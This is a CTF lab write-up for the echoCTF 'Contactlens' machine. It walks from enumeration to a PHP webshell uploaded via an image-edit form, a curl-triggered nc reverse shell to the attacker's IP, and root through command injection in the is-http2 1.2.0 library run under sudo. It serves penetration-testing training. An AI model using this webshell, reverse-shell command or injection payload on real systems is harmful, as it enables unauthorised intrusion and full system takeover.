---
title: "echoCTF Contactlens Writeup: File Upload to Root via Command Injection"
date: 2025-06-25
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["file upload", "PHP webshell", "Command Injection", "privilege escalation"]
description: "Step-by-step guide to cracking Contactlens on echoCTF with file upload exploits and command injection. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube 5FD9b_P4jRE >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=5FD9b_P4jREs)

# Enumeration

Start by port scanning the target machine
## NMAP

```bash
nmap -vv -Pn -p- -T4 10.0.50.0 -sC -sV
```
## NMAP Output

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 8c:e1:6f:39:a7:65:ac:64:06:c6:43:72:40:ca:3f:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeHruyMrJp6Aoww8WvypDa5GOOAa5d1wSC5fpaJ9CS8izg9dtWJOarrrZGAPgvA4RMa3a3qdapuUt342oLKfadUQKwZA9wHupAivBCLN1HmjN2RCOAmXHxTWse3cz0cv9ZEAHxtvNBO0nWmf63DrEAeDJXpkgV/dOgYHtll2yoDs0apKrdP7b3Br3YaGwUF/bVN6+WhTp9d2AXuHfDy28pe+a2t2YjuAwy34NlS7qjDyY1mqrBTyb7B7ZEwrPJjmli3iZA/9Ge//8O9mxCdW70IdMLbGrZ+fL0FHTvdP8Y/tOUndoCnY3BX3N4Jk44c5yxm0yPVMfYgBlST/tua0czRP3/qnM+KmoyDPGDwSFP1yaLSWL4OvVILOwqCzh7UsX/Z2lODK4QlxmP6jU2i2H3nOBA+T/I4BktAaIA7NB8Vn8DKEgu2iAT6JUVVapoFMvUUNgkqJYywMrx/39ZCyIOmg4XAniqmRgIIU02S5HylqWQQcaDylbqtrt1GmPLpUM=
|   256 2b:30:87:a5:9f:44:b8:3b:65:7e:94:75:e6:61:8f:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAwOrlGNc9A2kRYgbsM/dEziRmuM5PlVnN6Fig5UbRsJPGePGPD/pfkwTALxvOULoYWhRZesLQEBFFwM+XFHQHA=
|   256 15:e2:f7:e4:fa:0a:29:e3:7e:ce:36:ae:9f:3e:75:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINbIqZ2bHXwtkxS6Xm5dSUDBOJFo39M5VqA1lfSLnAC0

1337/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Contact Manager
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The nmap scan shows 2 ports open.
Port 22 is SSH
Port 1337, runs an nginx 1.18.0 web server.

Visit the webserver:
![Image Description](/images/con1.png)

Viewing the webserver we can find out that it uses PHP.

![Image Description](/images/con2.png)

# Exploitation

Lets start a directory brute force before while we examine the functionality of the web application.

```bash
gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php -o rsw.txt
```

Trying to run the command gives as an error regarding `Length:`. We can fix this with the `--exclude-length` flag

![Image Description](/images/con3.png)

```bash
gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php --exclude-length "10048" -o rsw.txt


/images               (Status: 301) [Size: 169] [--> http://10.0.50.0:1337/images/]
/conn                 (Status: 301) [Size: 169] [--> http://10.0.50.0:1337/conn/]
```

Trying to visit both directories gives as a 403 FORBIDDEN.

Lets examine the functionality of the application..

It seems we can add a "contact" along with an image

![Image Description](/images/con4.png)

Since we know that the webserver can execute PHP code we could try and upload a php file.

![Image Description](/images/con5.png)
![Image Description](/images/con6.png)

it seems that we cannot.

Notice that the web application allows the user to also edit the contact. We can try changing our contact's image with a php file.

```bash
cat test.php
<?php system($_REQUEST['cmd']); ?>
```

![Image Description](/images/con7.png)

Success!

Now since the file was supposed to be an image and according to our directory brute force attack we found a directory called images we can try to access our malicious PHP script under `/images/test.php`

![Image Description](/images/con8.png)

We have execution on the server!

Lets get a reverse shell by first checking if `nc` is installed on the target server utilising the `which` command likewise

![Image Description](/images/con9.png)

`nc` exist on the box so lets see if we can get a reverse shell.

```bash
sudo nc -nvlp 1337

curl 'http://10.0.50.0:1337/images/test.php?cmd=/bin/nc+10.10.11.150+1337+-e+/bin/bash'
```

Noticed that port 1337 was used to receive the shell. This is because we already know that the target server allows connection on that port as the webserver itself is running on that port!

![Image Description](/images/con10.png)

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

Manual enumeration i always do before going for automated scripts

```bash
# Check who we are?
id

# What other users exist on the box?
cat /etc/passwd | grep sh$

# Do i have sudo capabilities?
sudo -l

# Are there ant localservices running on the box?
netstat -ano | grep LIST
ss -antp

# Always check the directroy we landed it, in this case is `/var/www/html/images`
ls -la

# Check for wierd files in `/opt` and `/tmp`
ls -la /tmp && ls -la /opt
```

Analyzing the ouput

```bash
www-data@contactlens:~/html/images$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@contactlens:~/html/images$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ETSCTF:x:1000:65534:ETSCTF_65d03c84f1f6dc71ee01db6f9384f2d2:/home/ETSCTF:/bin/bash

www-data@contactlens:~/html/images$ sudo -l
Matching Defaults entries for www-data on contactlens:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on contactlens:
    (ALL : ALL) NOPASSWD: /usr/local/bin/contactlens
```

We can see that our user has the ability to run a command called `contactlens` as SUDO.

Lets examine what the command does and if we can exploit it!

At first glance we can see that the application requires 3 parameters
```bash
sudo /usr/local/bin/contactlens
You need three parameters URL,OpenSSL & includeSpdy
```

Be reading what the command does it is notice that the tool utilizes a node library called `is-http2`

```bash
cat /usr/local/bin/contactlens

#!/usr/bin/node
var ish2 = require("is-http2");
var args = process.argv.slice(2);
if(args.length<3)
{
  console.error("You need three parameters URL,OpenSSL & includeSpdy");
}
else {
  console.log(ish2(args[0],{openssl:args[1],includeSpdy: args[2]}));
}
```

Also when we try to see what else is inside `/usr/local/bin` we can see that the contactlens command is a link and if we examine the parent directories of its path we find the version of the `is-http2` node library `1.2.0`

```bash
www-data@contactlens:/usr/local/bin$ ls -la
total 8
drwxr-xr-x 1 root root 4096 Oct 24  2023 .
drwxr-xr-x 1 root root 4096 Apr 11  2023 ..
lrwxrwxrwx 1 root root   37 Oct 24  2023 contactlens -> ../lib/node_modules/ish2/bin/index.js


www-data@contactlens:/usr/local/bin$ cd ../lib/node_modules/ish2/bin/
www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ ls -la
total 12
drwxrwxr-x 2 root root 4096 Sep 13  2023 .
drwxr-xr-x 4 root root 4096 Oct 24  2023 ..
-rwxr-xr-x 1 root root  254 Sep 13  2023 index.js


www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ cd ..
www-data@contactlens:/usr/local/lib/node_modules/ish2$ ls -la
total 76
drwxr-xr-x  4 root root  4096 Oct 24  2023 .
drwxr-xr-x  1 root root  4096 Oct 24  2023 ..
drwxrwxr-x  2 root root  4096 Sep 13  2023 bin
drwxr-xr-x 77 root root  4096 Oct 24  2023 node_modules
-rw-r--r--  1 root root 53885 Oct 24  2023 package-lock.json
-rw-rw-r--  1 root root   322 Oct 24  2023 package.json


www-data@contactlens:/usr/local/lib/node_modules/ish2$ cat package.json

{
  "name": "ish2",
  "version": "1.0.0",
  "description": "",
  "main": "bin/index.js",
  "bin": {
    "contactlens": "bin/index.js"
  },
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "is-http2": "^1.2.0"
  }
}

```

When we search for exploit regarding `is-http2 1.2.0` we find a command-injection vulnerability!

![Image Description](/images/con11.png)

![Image Description](/images/con12.png)

It seems that we can inject system commands on `arg[1]` when running `contactlens` 

```bash
 sudo /usr/local/bin/contactlens "http://127.0.0.1" "touch /tmp/fromroot" "anything"
```

Even though it error out our command still executes!

![Image Description](/images/con13.png)

Now lets try to get a reverse shell as root. For this we going to utilize `nc` and port `22` as we already know its open from out nmap scan.

![Image Description](/images/con14.png)

ROOT!